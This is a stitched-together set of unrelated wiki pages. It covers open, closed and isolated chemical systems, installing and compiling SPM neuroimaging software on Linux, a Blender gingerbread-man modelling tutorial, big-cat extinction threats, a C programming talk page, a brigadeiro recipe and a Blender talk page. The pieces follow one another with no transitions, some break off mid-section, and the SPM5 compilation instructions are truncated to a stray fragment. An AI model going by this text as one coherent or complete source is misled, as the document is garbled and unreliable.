In chemistry, it is important to define what is to be studied, and how it is affected or itself affects the surroundings. Which space is the object within? Does it exchange heat with its surroundings? And so on. In order to make a framework of these studies, there are some definitions:

* A '''macroscopic system''' is a system containing of a large number of entities, such as a liquid or a gas.
* In the '''microscopic system''', the object of study is an individual object, such as an atom or a molecule.

In this way a system could be said to be a defined part of the world, which means it has to be definable and locatable in some way; speed, place, etc. The most important issue is of course where it is, and this leads us to what is defined as the '''surroundings'''. The surroundings is everything that is NOT the system, which per definition means the rest of the universe. The system and the surroundings together are called the '''&quot;universe&quot;'''.

One important issue is what kind of interactions exist between the system and its surroundings. Some systems may exchange matter and heat with the surroundings (i.e. a system of boiling liquid is losing matter and heat with the vapor). This is called an '''open system'''. If there is just heat exchange occurring between the system and its surroundings it is called a '''closed system.''' And, finally, if there is zero exchange of heat and zero exchange of matter, the system is '''isolated'''.

All versions of SPM are supported under Linux 64 bit and the installation should be fairly the same with any version. You might have to recompile SPM MEX files (*.mexa64) if those provided with the SPM distribution do not appear to be compatible with your system.

== SPM12 ==

=== Installation ===

Download [http://www.fil.ion.ucl.ac.uk/spm/software/download.html spm12.zip] and its updates [http://www.fil.ion.ucl.ac.uk/spm/download/spm12_updates/ spm12_updates_rxxxx.zip] in your home directory then type the following in a Terminal:
&lt;pre&gt;&lt;nowiki&gt;
cd /home/login
unzip spm12.zip
unzip -o spm12_updates_rxxxx.zip -d spm12
&lt;/nowiki&gt;&lt;/pre&gt;
Start MATLAB and add SPM into your path, either using ''File &gt; Set Path &gt; Add Folder...'' or typing
&lt;pre&gt;&lt;nowiki&gt;
addpath /home/login/spm12
&lt;/nowiki&gt;&lt;/pre&gt;
in MATLAB's workspace.

=== Compilation ===

In a Terminal, from the ''src'' folder of your SPM12 installation, type:
&lt;pre&gt;&lt;nowiki&gt;
cd /home/login/spm12/src
make distclean
make &amp;&amp; make install
make external-distclean
make external &amp;&amp; make external-install
&lt;/nowiki&gt;&lt;/pre&gt;

== SPM8 ==

=== Installation ===

Download [http://www.fil.ion.ucl.ac.uk/spm/software/download.html spm8.zip] and its updates [ftp://ftp.fil.ion.ucl.ac.uk/spm/spm8_updates/ spm8_updates_rxxxx.zip] in your home directory then type the following in a Terminal:
&lt;pre&gt;&lt;nowiki&gt;
cd /home/login
unzip spm8.zip
unzip -o spm8_updates_rxxxx.zip -d spm8
&lt;/nowiki&gt;&lt;/pre&gt;
Start MATLAB and add SPM into your path, either using ''File &gt; Set Path &gt; Add Folder...'' or typing
&lt;pre&gt;&lt;nowiki&gt;
addpath /home/login/spm8
&lt;/nowiki&gt;&lt;/pre&gt;
in MATLAB's workspace.

=== Compilation ===

In a Terminal, from the ''src'' folder of your SPM8 installation, type:
&lt;pre&gt;&lt;nowiki&gt;
cd /home/login/spm8/src
make distclean
make &amp;&amp; make install
make toolbox-distclean
make toolbox &amp;&amp; make toolbox-install
make external-distclean
make external &amp;&amp; make external-install
&lt;/nowiki&gt;&lt;/pre&gt;

Required development packages: make, gcc.

== SPM5 ==

=== Installation ===

Download [http://www.fil.ion.ucl.ac.uk/spm/software/download.html spm5.zip] and its updated MEX files [ftp://ftp.fil.ion.ucl.ac.uk/spm/spm5_updates/SPM5_Matlab7.9_LINUX64_MEX.zip SPM5_Matlab7.9_LINUX64_MEX.zip] in your home directory then type the following in a Terminal:
&lt;pre&gt;&lt;nowiki&gt;
cd /home/login
unzip spm5.zip
unzip -o SPM5_Matlab7.9_LINUX64_MEX.zip -d spm5
&lt;/nowiki&gt;&lt;/pre&gt;
Start MATLAB and add SPM into your path, either using ''File &gt; Set Path &gt; Add Folder...'' or typing
&lt;pre&gt;&lt;nowiki&gt;
addpath /home/login/spm5
&lt;/nowiki&gt;&lt;/pre&gt;
in MATLAB's workspace.

=== Compilation ===

make &amp;&amp; make install
&lt;/nowiki&gt;&lt;/pre&gt;

== SPM2 ==

=== Installation ===

Download [http://www.fil.ion.ucl.ac.uk/spm/software/download.html spm2.tar.gz] and its updated MEX files [ftp://ftp.fil.ion.ucl.ac.uk/spm/spm2_updates/SPM2_LINUX64_MEX.tar.gz SPM2_LINUX64_MEX.tar.gz] in your home directory then type the following in a Terminal:
&lt;pre&gt;&lt;nowiki&gt;
cd /home/login
tar xvfz spm2.tar.gz
tar xvfz SPM2_LINUX64_MEX.tar.gz -C spm2
&lt;/nowiki&gt;&lt;/pre&gt;
Start MATLAB and add SPM into your path, either using ''File &gt; Set Path &gt; Add Folder...'' or typing
&lt;pre&gt;&lt;nowiki&gt;
addpath /Users/login/spm2
&lt;/nowiki&gt;&lt;/pre&gt;
in MATLAB's workspace.

=== Compilation ===

In a Terminal, type:
&lt;pre&gt;&lt;nowiki&gt;
cd /home/login/spm2
make clean.Linux.A64
make Linux.A64
&lt;/nowiki&gt;&lt;/pre&gt;

==Troubleshooting==

===&quot;bad image handle dimensions&quot; error===
The error &quot;bad image handle dimensions&quot; when trying to display an image is an indication that you need to (re)compile the SPM MEX files.

===&quot;cannot find -lstdc++&quot; error===
If you get the error message &quot;cannot find -lstdc++&quot;, you can install the libstdc++5 package using your package manager (e.g. using ''sudo apt-get install libstdc++5'' on Ubuntu), or see the &quot;Other problems with lstdc++&quot; section below.

If, after the install of libstdc++5, the lstdc++ error persists, just do a symbolic link like
 ln -s /usr/lib64/libstdc++.so.6 /usr/lib64/libstdc++.so 
and it should work. If not, see next.

Alternatively, you might be tempted to follow these instructions: http://www.lukedodd.com/?p=225

===Other problems with lstdc++===
If you get the above error and cannot install libstdc++ (e.g. you do not have root/admin access), or if you get other problems such as &quot;... version `GCC_4.2.0' not found (required by /usr/lib64/libstdc++.so.6&quot;, then another option is to edit your mexopts.sh config file and delete or disable the -lstdc++ compiler flags, for example simply use find-and-replace to delete all instances of '' -lstdc++''.  SPM will compile properly without this.

It's best to edit a local copy of mexopts.sh (the original is found in the bin directory with your matlab and mex executables). If you run &lt;code&gt;mex -setup&lt;/code&gt; it will interactively create a copy for you, under &lt;code&gt;~/.matlab/RELEASE&lt;/code&gt; for example
 ~/.matlab/R14SP3/mexopts.sh
 ~/.matlab/R2008b/mexopts.sh
or similar, and you may then further edit that copy if required. If you match the release, mex will find your copy of mexopts.sh. Note that from MATLAB 
 version
should show you the release, but with parentheses around it, e.g. &quot;(R14SP3)&quot;.

===&quot;mex: command not found&quot; error===
If you get the error &quot;mex: command not found&quot; check that mex is in your path.  Either add the MATLAB binary directory (usually /usr/local/matlab/bin) to your path or create a link to mex somewhere already in the path (usually /usr/local/bin).

*Adding the path: 
**Type: &lt;code&gt;PATH=/usr/local/matlab/bin:$PATH&lt;/code&gt;
*Creating a Link: 
**Enter your local binary direcotry: &lt;code&gt;cd /usr/local/bin&lt;/code&gt;
**Create the link: &lt;code&gt;ln -s /usr/local/matlab/bin/mex&lt;/code&gt;
**(Note: Creating a link in /usr/local/bin requires root privileges).

Another solution is to edit the Makefile (&lt;code&gt;spm8/src/Makefile.var&lt;/code&gt; for SPM8 or &lt;code&gt;spm5/src/Makefile&lt;/code&gt; for SPM5) and mention the full path when referring to MEXBIN:
 MEXBIN = /usr/local/matlab/mex

===&quot;This is pdfTeX, Version ... (TeX Live 2011)&quot; error===
If you get the error:
 mex: unrecognized option `-O'
 mex: unrecognized option `-c'
 This is pdfTeX, Version ... (TeX Live 2011)
This is due to a conflict between MATLAB mex and a LaTeX command (from the texlive package) with the same name. Change PATH or MEXBIN as described in the previous solution.

===Missing files===
If you get build errors such as &lt;code&gt;math.h&lt;/code&gt; does not exist when trying to execute the command &quot;make &amp;&amp; make install&quot;,
then you probably need to install the build-essentials package.  At the command line type: &quot;sudo aptitude install build-essential&quot;  (for Ubuntu).
if you have sudo privileges or simply log in as root or obtain superuser status and type: &quot;aptitude install build-essential&quot;.  

==Compilation notes for SPM2:==
===Updates for ''Makefile''===
In order to make the recompilation process work, the '''Makefile''' provided in the '''spm2.tar.gz''' package needs to be patched.
Also the file '''spm_platform.m''' needs an update.

The updated '''Makefile''' adds a new architecture, '''Linux.a64''':
 Linux.a64:&lt;br&gt;
   make all SUF=mexa64  CC=&quot;gcc -O3 -funroll-loops -fPIC -march=x86-64&quot; \&lt;br&gt;
   MEX=&quot;mex COPTIMFLAGS='-O3 -funroll-loops -fPIC -march=x86-64'&quot;
Plus an appropriate section for '''clean''' and '''verb.mexa64'''.

The '''-fPIC''' option is necessary to allow linking on 64bit Linux.&lt;br&gt;
'''-march=x86-64''' provides generic optimisations for both '''Opteron''' and '''64bit Xeon'''. If the code is running on a '''64bit Xeon''' you can change it to '''-march=nocona''' (the first revision of the Xeon processor supporting EM64T had codename '''nocona'''), if you have an '''Opteron''' or '''Athlon64''', change it to '''-march=opteron'''. This might give you an extra performance boost.

===Updates for ''spm_platform.m''===
Matlab for 64bit Linux identifies itself as '''GLNXA64''' as opposed to '''GLNX86''' when running 32bit Matlab. 
''Endian-ness'' doesn't change, so I added this to the '''PDefs''' cell 
list:
                 'GLNXA64',      'unx',  0;...

and added '''GLNXA64''' to the list of other unix platforms at the font 
configuration.

In this tutorial you will learn how to make a simple gingerbread man.  In a later tutorial you will be able to make an animation with this gingerbread man.

In this tutorial we will tie together everything we've talked about up to this point, including extruding, subdividing and rendering, and throw in basic lighting.

== Modeling ==
First, start Blender. You should see the usual top view of a cube in the 3D window, surrounded by a grid 'floor'. 
: Review&amp;mdash; Zoom in or out with '''SCROLL''' or '''CTRL+MMB'''. Pan with '''SHIFT+SCROLL''' and '''CTRL+SCROLL'''. Make sure you are in orthographic view. Press '''NUM5''' to toggle between orthographic view and perspective view. You can tell you're looking at an orthographic view while looking down from the top ('''NUM7''') of the cube: wherever you pan the window, you never see any part of the cube except the top.
* Display editing controls in the buttons window by clicking on the Editing context button [[Image:Editing.png]] or by pressing '''F9'''.

=== Adding Vertices ===
* Select the cube by clicking '''RMB''' on it. (It may already be selected.) Remember, selected objects are outlined in pink.
* Switch from object mode to edit mode by pressing '''TAB''', which toggles between object and edit modes. In edit mode, at first, you'll see colored dots at the vertices of the cube. Selected vertices are highlighted in yellow. Unselected vertices are pink. (You'll see the dots when editing in vertex select mode. In edge select or face select mode, you'll see colored edges and faces instead.) 
* Select all vertices of the cube. Press '''AKEY''' once. If the vertices are yellow, you've selected all of them. If they are pink, you've deselected all of them. If necessary, press '''AKEY''' again so that all vertices are selected/yellow. 
[[Image:BlenderCubeEdit.png|center]]

* Subdivide the faces of the cube, using any of the following methods. (All vertices of the cube should still be selected.)
** Click the Subdivide button in the Mesh Tools panel in the buttons window. 
** With the mouse pointer in the 3D window &amp;ndash;
*** Press '''WKEY''' to display the Specials menu, then choose Subdivide.
*** Press '''SPACE''' to display the toolbox, then choose Edit &amp;rarr; Edges &amp;rarr; Subdivide.
** Click the 3D window's Mesh menu, and choose Edges &amp;rarr; Subdivide.
* Your cube now has more vertices. '''Subdividing''' edges adds vertices so you can create more complex shapes.
[[Image:BlenderSubdividedCube.png|center]]

=== Selecting a Subset of Vertices ===
We'll select six vertices on the upper half of one side of our cube, where we'll extrude an arm.
* Deselect all vertices by pressing '''AKEY'''.
* View the cube from the front ('''NUM1''').
* Select the six vertices on the top half of the left side of the cube (see below) using one of the following methods.
** Press '''BKEY''' and drag a rectangle around the top left and middle left vertices (viewing from the front).
** Press '''CKEY''' to see a circle around your mouse pointer. '''SCROLL''' to change the size of the circle. Position the circle around the top left and middle left vertices, together or one at a time, and click '''LMB'''. Click '''RMB''' to finish.

* Take a closer look at the selected vertices by viewing the model from a different angle (drag with '''MMB'''). 
* If you find that you have only selected two vertices and not six, make sure the &quot;Occlude Background Geometry&quot; button is off. That button is the right-most of the selection mode buttons, below. (It's called &quot;Limit selection to visible&quot; in Blender 2.45 and earlier. It doesn't appear if Blender is drawing in wireframe style.) Try selecting the vertices again.
[[File:BlenderSelectionModesInSolidMode.png|center]]
* If you still selected just two vertices, change to a wireframe drawing by pressing '''ZKEY''', which toggles between wireframe and solid drawing types. Try selecting again.
* Yet another way to select the six vertices is to select the two faces they define. Click the Face Select button from the selection mode buttons (above), or press '''CTRL+TAB''' to display a Select Mode menu and choose Faces. Rotate the cube to view the left side and click '''RMB''' in the center of one of the two upper faces. Hold '''SHIFT''' and click '''RMB''' in the center of the other upper face.
[[File:BlenderGingerBreadManExtrudedCube3D.png|center]]

=== Extruding Arms ===
* View from the front by pressing '''NUM1'''.
* Extrude the selected vertices/faces by pressing '''EKEY''' to display an Extrude menu, then choosing Region. Hold '''CTRL''' to snap your position to the grid, then move your mouse left to put the new vertices on the adjacent gray line of the grid one unit to the left. Click '''LMB'''. 
* Repeat so that your model looks like below (from front view, '''NUM1''').
[[Image:ExtrudedCube1.png|center]]

* Deselect all vertices/faces with '''AKEY'''.
* Perform the same extrusion on the right side of the cube, selecting six vertices and extruding twice as explained above.  
* The gingerbread man's arms are in place, as in the illustrations below.
&lt;center&gt;[[Image:ExtrudedCube2.png]]&amp;nbsp;&amp;nbsp;[[File:BlenderGingerBreadManExtrudedCube3D.png]]&lt;/center&gt;

=== Extruding Legs ===
* Make sure all vertices are unselected, using '''AKEY''' once or twice.
* View from the front ('''NUM1''').
* Select the six vertices on the left half of the cube's bottom. Extrude them downward to a point in between the first and second heavier gray lines beneath the cube. (The gray lines in the grid represent Blender units.) Holding down '''CTRL''', the extruded region may snap to the heavier gray lines&amp;mdash;hold down '''CTRL+SHIFT''' and the region will snap to tenths of Blender units. Click '''LMB''' to finish.
* An alternative to positioning the extrusion with the mouse is simply typing the distance. Enter 1.5 to extrude 1 1/2 units out. On a Mac, enter the number 1, press fn with the key that is right under '''LKEY''' and '''MKEY''' on Azerty (the one with /:,), and press the number 5.
&lt;center&gt;[[File:BlenderGingerbreadManLeftLeg01.png]]&amp;nbsp;&amp;nbsp;[[File:BlenderGingerbreadManLeftLeg02.png]]&lt;/center&gt;

* Extrude the same region again, to the third gray line (1.5 again). It should look like this:
[[File:BlenderExtrudedLeg.png|center]]

* Shift the lower leg to the outside as follows.
** Select the bottom 12 vertices of the leg (which look like 4 from front view), using '''BKEY'''. 
** Grab the selection with '''GKEY'''. Press '''XKEY''' to limit movement to the x axis. Move the vertices to the left by half a square, holding '''CTRL''' or '''CTRL+SHIFT''' to snap to the grid, and click '''LMB'''.
&lt;center&gt;[[File:Oneleg-ginger.png]]&amp;nbsp;&amp;nbsp;[[File:BlenderGingerBreadManOneLegGinger3D.png]]&lt;/center&gt;

* Create a second leg on the right side, in the same fashion.
[[File:twoleg-ginger.png|center]]

=== Dropping the Groin ===
Lengthen the groin (where the two legs join):
* Deselect all vertices by pressing '''AKEY'''.
* Select the 3 vertices at the groin (which look like 1 from front view), using '''BKEY'''.
* Grab the vertices by pressing '''GKEY'''. Press '''ZKEY''' to limit movement to the z axis. Move the vertices down 1/2 of a square, or type -0.5 to specify the distance. (Older versions of Blender require  '''NKEY''' before typing -0.5.) 
&lt;center&gt;[[File:twoleg-ginger-pulled.png]]&amp;nbsp;&amp;nbsp;[[File:BlenderTwoLegsGingerPulled3D.png]]&lt;/center&gt;

=== Adding a Head ===
* Switch the 3D window from Edit mode back to Object mode by pressing '''TAB'''.
Noob Note: I found it easier to remain in edit mode while creating the cube as this makes the cube part of the original mesh. This allows you to add the subsurf to all parts at once. 

* Click '''RMB''' on the object to select it then press '''SHIFT + SKEY''' and select ''Cursor &amp;rarr; Selection''. This will make sure the cube you'll add next will be near where you want it.

* Press '''SPACE''' and put your mouse on the mesh option and select cube. In others versions, you can also hit '''SPACE''' and , in the menu that comes up, choose ''Add &amp;rarr; Mesh &amp;rarr; Cube''.

* Press '''GKEY''' and put your new cube about 1/3 of the way down the neck (to achieve this, you can press '''GKEY''' and '''ZKEY''' : enter 1.33).
[[Image:twoleg-ginger-head.png|center]]

Now we will make it look more like a ginger bread man by making it thinner.
*Select all with '''AKEY'''.

* Go to side view with '''NUM3'''.

* Press '''SKEY''' for scale and press '''YKEY''' for Y-axis and then move your mouse to the middle until it is about 0.3 (use '''CTRL''' for fixed values).

* Remember X-axis is the Red arrow/line, Y-axis is the Green one, and Z-axis is Blue (like RGB video mode).
[[image:ginger-zscale.png|center]]

* Use the '''MMB''' to spin the view around and examine your handiwork.

At this point, it doesn't look entirely like a gingerbread man, does it?  It's a bit too ... chunky. For the last bit, we'll smooth it out.

* Make sure you've selected the body in object mode.

* Select the editing panel in the buttons window (or hit '''F9''').

* In the Modifiers tab, Add a &quot;Subsurf&quot; modifier.

* Set the level of the subdivisions to 2, and the number of render levels to 3.

'''Noob question:  When I add the cube for the head, it stops me from being able to edit the body - it will only select the head to apply subsurf to, even if the body looks like it's selected!'''

'''Answer: When you created the cube you made a second object. To select a different object, press tab to enter Object mode. Select the body. Then enter edit mode again if you want to edit the body.'''

* You can press the '''ZKEY''' to switch back and forth between wire-frame view and solid view.

* (Noob Note: Easiest way to really get a feel for what is going on in the 3d world is to split into four screens and setting each one to '''NUM7''', '''NUM3''', '''NUM1''', and '''NUM0''' to see all angles and what it will look like at render.)
'''Noob Question: ''How?'''''

'''Answer: To split an area move the cursor to an area between two current areas (e.g. between the 3D view and the buttons), when you see the double ended arrow (used to move the divide) click RMB and select ''Split Area'', you will then see a line appear dividing the area in two.  Move this to where you want the divide and click LMB.'''

* In the 'Link and Materials' section, select 'Set Smooth'.
'''Noob question:  Where?  Assuming this refers to the 'Materials' section on the 'Properties' window, there is no 'Smooth' setting.'''

''(Note that here I had the same problem as before, with superposed vertices. Select all vertices, then press '''WKEY''' and select ''Remove Doubles'' to clean your model. You will see that it will look much better after removing the extra vertices with Remove Doubles)''
[[image:ginger-smoothbody.png|center]]

* Press the '''ZKEY''' to return to wire-frame view.

* Now repeat the process above to smooth the head.

[[image:ginger-smoothall.png|center]]

Looks a lot more like a gingerbread man now, doesn't it?

== Camera Positioning and Rendering ==
This guide will show you how to intuitively get the best frame of your 3D scene with no effort!

* Press '''TAB''' for Object view mode.
* Press '''NUM0''' to get the Camera View.
* Select the camera by clicking '''RMB''' on the outermost rectangle.
* Press '''GKEY''' and move your mouse to adjust the position of the camera ('''XKEY''', '''YKEY''', '''ZKEY''' and '''CTRL''' may be useful here).
* In addition, you can press '''NUM7''' to get the Top View and press '''RKEY''' to rotate the camera to the best angle.
* After you are happy with the position, press '''F12''' to render it.
If your render comes out a little dark, try moving the lamp closer to the gingerbread man.

Noob note: Another way to move around the camera is pressing '''SHIFT + FKEY''' after pressing '''NUM0''' to enter Fly mode. The keys for fly mode appear in the header of the 3D view pane.

Noob note: '''Ctrl+Alt+NUM0''' &quot;teleports&quot; the camera to your 3d view.


[[Image:BlenderGingerRender.png|center]]

Noob Note: By pressing X, Y or Z twice you will use a local base of the space, with those it's much easier. For example if you are facing the Z axis from 45 degrees, and you want to go left 1 unit, using the global base, you will have to go 1.72 (around sqrt(2)) along X and the same along Y, instead moving by 1 in the local frame of reference.

== Applying Textures ==
&lt;br&gt;
This builds on the previous guide:  [http://en.wikibooks.org/wiki/Blender_3D:_Noob_to_Pro/Modeling_a_volcano Modeling a Volcano].
&lt;br&gt;&lt;br&gt;
Note: It seems that textures can only be applied to one object at a time, so this must be done twice (i.e. The head and body are two separate objects.)  The settings that were chosen can successfully be applied to each object for a consistent result.  Some settings can not be applied equally for consistent results.

N00b Note: if you join the 2 objects before applying the textures you do not have to do the process 2 times, just select the 2 objects, CTRL+J and the accept
&lt;br&gt;&lt;br&gt;
*In &quot;Object Mode,&quot; select the body (or the head.)
*Press '''F5''' to open the shading panel or use the shading panel button.
*In the &quot;Links and Pipeline&quot; panel, under &quot;Link to Object,&quot; click &quot;Add New.&quot;
[[File:LinksPipeAddNew.png]]
*Press '''F6''' to open the &quot;Texture Buttons&quot; panel or use the textures button.
*In the &quot;Texture&quot; panel, click &quot;Add New.&quot;
[[File:TextureAddNew.png]]
*Change the &quot;Texture Type&quot; to &quot;Stucci.&quot;
[[File:StucciType.png]]
*In the new &quot;Stucci&quot; panel, change &quot;Noise Size&quot; to something near 0.025 and leave the &quot;Turbulence&quot; at 5.00.
[[File:SizeTurbulence.png]]
&lt;br&gt;
Note: When finished with this section of the guide, come back to this panel and try different combinations of &quot;Plastic,&quot; &quot;Wall In,&quot; &quot;Wall Out,&quot; and &quot;Soft Noise&quot; / &quot;Hard Noise.&quot;  Press '''F12''' to render after each change to see the effect.
&lt;br&gt;&lt;br&gt;
*Press '''F5''' again or use the &quot;Material&quot; button directly on the left of the &quot;Texture&quot; button.  Then look for the &quot;Map To&quot; panel.
[[File:LookForMapTo.png]]
*In the &quot;Map To&quot; panel, deselect &quot;Col''[or]''&quot; and select &quot;Nor''[mal]''.&quot; and change the &quot;Nor&quot; Value to approximately 1.30.
*In the &quot;Map Input&quot; panel, change the texture coordinates to &quot;Object&quot; by clicking the corresponding button.
*In the &quot;Material&quot; panel, change the &quot;R''[ed]''&quot; slider to approximately 0.400 and the &quot;G''[reen]''&quot; slider to approximately half that, about 0.200.  Blue can be set at 0.00.
[[File:MapToChange.png]]  [[File:MapInputChange.png]]  [[File:MaterialChangePreview.png]]
&lt;br&gt;
Note: While it is true that textures can only be applied to one object at a time, textures as well as materials can be shared between objects. In this case it is best to let both the head and the body share the same material.
&lt;br&gt;
*To do this, simply select the object without the materials(head or body).
*Press '''F5''' to open the shading panel or use the shading panel button.
*In the &quot;Links and Pipeline&quot; panel, under &quot;Link to Object,&quot; click the arrow next to(left of) the &quot;Add New&quot; button.
*Select the brown material.
&lt;br&gt;
The steps in this section give a nicely textured, brown surface to the &quot;Gingerbread.&quot;

Now all you need to do is add eyes and gumdrop buttons!

I Started using blender when my dad (renier also a major af.wikipedia contrebutor) brought a open-source cd home (thats when we started moving to the open source area) and there was a example of blender in there so yeah I downloaded blender and started using blender&lt;br&gt;

I Started learning blender ever since and I now have a 1.5 year experience and I`m starting to use the blender game engine to create programs for SASOL&lt;br&gt;

and I`m now gonna start creating my new game TAXI&lt;br&gt;

So I`ll write tutorials abot the blender game engine so that I will learn even more about the game engine&lt;br&gt;

E-mail me at Freakazo@bummer.co.za for anything really I`m looking to join a projector something and will help you step by step if you need any kind of help&lt;br&gt;

==Extinction is Forever==
[[Image:Java Tiger.jpg|thumb|right|A photo of an extinct Bali tiger]]
Some big cats throughout history have become extinct because they were replaced with newer species better suited to the environment. The Sabretooth (''Smilodon fatalis'') is one example of a large Ice-Age predator that died out because the large prey it needed retreated with the glaciers. Pumas and jaguars now roam where the mighty Sabertooth once ruled.  Natural extinction is part of the grand drama of life on Earth. However, many more cat species are in danger of dying out due to unnatural extinction, the killing of an entire species by man for reasons having nothing to do with fitness for survival. These species are not replaced with newer ones, their death merely leaves a hole in the fabric of life on Earth.

==Predation==

Many big cats have been killed because they either compete with humans for the same prey animals or because they occasionally attack human-raised livestock. Some big cats that become too weak to hunt their own natural prey find domestic livestock much simpler to acquire. Other big cats develop a taste for livestock out of sheer opportunity. There are times when control of individual predators, through moving or killing, appear to be justified. However there is a much more dangerous approach to predator control where an entire population or even an entire species is classified as a &quot;pest&quot; and open to ''extermination''.  

Extermination is an attempt to kill every last individual of a population or species. There were times when pumas were targeted for extermination in large areas of the American west.  Bobcats and jaguars have also been targets of extermination. These days most governments in the world agree that extermination is not a good way to control cats, but sometimes local peoples ignore laws designed to protect species from extermination.

==Sport Hunting==

The majority of people in western countries no longer give big game hunters the same respect they once held in the writings of Ernest Hemmingway. The cheetah, which was once abundant in India, was hunted to complete extinction there. The Mughal emperor Akbar killed nearly 1000 cheetahs during his lifetime when the number of cheetahs was already declining. The Asian lion met with the same fate.

Most outdoorsmen no longer seek trophies for their mantles and entrance halls. However, a number of people still consider locating, outwitting, and defeating large predators to be the ultimate test of courage and a satisfying form of enjoying the out of doors. This practice is losing popularity, though. In all fairness, it should be said that sport hunters support laws and practices that benefit wildlife. 

In the United States, wildlife populations have increased within the past century. This is largely due to funds generated via an excise tax on hunting equipment known as the Pittman-Robertson Act. In addition, sportsmen contribute hundreds of millions of dollars each year to wildlife conservation through sporting organizations that benefit all wildlife.

==Poaching==

People who defy existing laws to kill predators for money, animal parts, or personal reasons are called poachers.  As outlaws, many poachers are dangerous people who are willing to protect their livelihood through violent means.  Famous conservation leaders George Adamson and Diane Fossey were killed by poachers who saw them as a threat.  Stopping poaching is very difficult because most big cat habitat is remote land that is difficult to patrol and exists in some of the world's poorest countries without many law enforcement resources.  The most effective way to curb poaching is to reduce the demand for the products they provide. 

==Folk Medicines==

A number of people believe, without any scientific evidence, that folk medicines made from parts of big cats can treat or even cure certain illnesses and conditions. Belief in sympathetic magic, that like-causes-like, leads people to seek the attributes they most admire about big cats by using parts of their bodies. People seeking courage, strength, or a greater capacity for physical intimacy attempt to acquire those things through eating, drinking, applying or wearing parts of the animals that are supposed to possess those traits.  For nearly everything supposedly treatable with feline folk medicines, there are effective, safe and proven remedies available in modern medicine.

==The Fur Trade==

The soft, warm, boldly patterned ''pelts'' (skins with fur) of big cats were long considered the ultimate expression of fashion and extravagance. Even today, most fashion items made with real fur come from carnivores such as bobcats and mink. Those legal for sale are produced from animals raised on fur farms rather than taken from the wild. The vast majority of natural leopard, ocelot, lynx and jaguar furs are banned on the international market by laws protecting endangered species.

==Habitat Loss==
[[Image:Clearcutforest.jpg|thumb|right|Habitat loss is the silent killer]]
Habitat loss is the silent killer.  An animal's habitat is an area where it can live, and for most large predators that means cover, adequate prey, freedom of movement, and water.  Due to their predatory lifestyle, most big cats require large areas of land without many manmade barriers where they can hunt and raise young unmolested. 

Uncontrolled development of wild areas, including such wasteful practices as slash-and-burn agriculture, reduce the number of places where big cats can survive and thrive. To some degree protected areas known as Parks and Wildlife Sanctuaries help preserve endangered species habitat. 

However in many poor countries there is not adequate law enforcement to prevent poaching or illegal development of land inside park boundaries. In addition, animals need more land than the human race can afford to protect in parks. 

More enlightened use of habitat by man can increase the number of big cats and preserve their genetic diversity. For instance, a timber plantation can provide both high quality wood and habitat for predators and their prey. Using ''sustainable management'' techniques, land can provide a never-ending source of quality wood products while continuing to preserve wildlife.

==It Is Up To You==

As someone interested in big cats, you can make your love of big cats known through the way you vote, your lifestyle, and your charitable giving.  Governments can only do so much to help stop extinction.  For big cats to be saved, they must be saved by all of us working together.  Learn what you can do about the challenges facing your favorite animals, and get involved.  Always remember: &quot;We appreciate what we understand and save what we appreciate.&quot;

      <text xml:space="preserve">Q: why not use the &lt;iostream.h&gt; functions cin and cout ?

A: You're thinking of &lt;iostream&gt;. Those functions don't work in ANSI C. They're [http://cplus.about.com/od/cprogrammingtip1/l/aa030702a.htm C++ thingies]. (I often wish I could use them in plain C, but I can't -- go to [[Programming:C plus plus]] if you want to talk about them.)

----

The abridged list of I/O format specifiers appearing on this page is incorrect, and is inconsistent with the more comprehensive list, which appears in the [[C_Programming/File IO#Formatted output functions: the printf family of functions|File I/O section]]:--

*%i and %d - int     (ok)
*%f - float          (wrong: &quot;%f&quot; is &quot;double&quot; - &quot;float&quot; gets promoted to &quot;double&quot; in the function call)
*%lf - double        (maybe, but the &quot;l&quot; qualifier is meaningless with &quot;%f&quot;, and some printf() or scanf() implementations may choke on it; did you mean &quot;%Lf&quot;, which is &quot;long double&quot; in C99?)
*%s - string         (ok)
*%x - hexadecimal    (only partially correct; the data type is &quot;int&quot;; the representation is &quot;hexadecimal&quot;)

== fflush(stdin) ==

This will result in undefined behavior, so why it's mentioned as a thing that flushes stdin's buffer?</text>

{{recipe}} | [[Cookbook:Dessert|Dessert]] | [[Cookbook:Cuisine of Brazil|Brazilian Cuisine]]

'''Brigadeiro''' is a simple Brazilian chocolate fudge candy created in the 1920s.  It is named after Brazilian airman Brigadeiro Eduardo Gomes. It's commonly served with soda, coffee or milk.

== Ingredients ==
Warning.  This does not produce anything which can hold a spherical shape.  The ingredients and procedure below produce a tasty pudding/mousse.  Even when cool it still flows as a liquid.

* 1 can of [[Cookbook:Condensed milk|condensed milk]] (395g)
* 3 [[Cookbook:Tablespoon|tablespoon]]s of [[Cookbook:Cocoa powder|cocoa powder]]
* 1 packet of [[Cookbook:Chocolate|chocolate sprinkle]]s
* 1 [[Cookbook:Tablespoon|tablespoon]] of [[cookbook:butter|butter]]

== Procedure ==

# In a heavy [[cookbook:saucepan|saucepan]], mix the milk, cocoa and butter. Stir to dissolve the chocolate.
# Put over low heat and stir constantly with a wooden spoon.
# Continue stirring until you are able to see the bottom of the pot when you tilt the pan - the mixture should slide quickly. This should take 10-12 minutes. 
# Transfer to a greased plate. 
# Allow to cool. 
# Butter your hands and roll the mixture into small balls (around 2cm in diameter) and roll them over the chocolate sprinkles.

== Variations ==

You can substitute the cocoa powder for 100g of baking chocolate. If you want a lighter candy use powdered chocolate (such as Nestlé Quick). You can also put [[cookbook:raisin|raisin]]s or [[Cookbook:Nut|nut]]s in the center of the candy. You can decorate with powdered [[Cookbook:Sugar|sugar]] instead, or cocoa powder.

Brazilian brigadeiros also have gourmet varieties. Some references are available in specialized houses in Brazil: [http://www.mariabrigadeiro.com.br Maria Brigadeiro] and [http://www.brigadeirissimo.com.br Brigadeiríssimo] and [http://www.BrigadeiroGourmet.com Brigadeiro Gourmet]

      <text xml:space="preserve">==Uh Oh==

I finished the whole tutorial, but then, as I rotated the view, only the initial cube was 3D the rest was flat! Oh no! What can I do?


• Make sure that you select &quot;Region&quot; and not &quot;Only Vertices&quot; or &quot;Only Edges&quot; when you press the EKEY. Or maybe you just have selected the two vertices you see in front view (NUM1) but didn't select the whole four vertices in front view (NUM7) as written in the tutorial. I hope this helps because I made this mistake by myself and then I found out that I had the wrong selection. ;)

==The right leg's foot?==

How do I create a foot for the right leg? I did the extrusions, but not foot was put on the right leg. Doing so was not described. One section tells me to grab four vertices. However, the end-product uses all cubes for the figure. Wouldn't I have to grab all of the vertices and copy the cube? I seem to be grabbing a square tile instead of a cube.

== Small Change ==

